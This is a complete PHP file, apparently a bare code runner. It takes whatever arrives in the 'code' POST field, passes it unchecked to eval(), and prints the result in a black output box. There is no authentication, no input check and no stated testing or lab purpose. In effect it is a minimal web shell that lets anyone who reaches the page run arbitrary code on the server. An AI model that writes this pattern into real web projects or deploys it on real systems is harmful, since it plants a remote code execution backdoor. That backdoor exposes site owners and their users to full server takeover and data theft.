<?php
if(!empty($_POST['code']))
{
	echo '<div class="output" style="padding: 10px; margin-top: 10px;background: black; color: white;">';
	eval($_POST['code']);
	echo '</div>';
}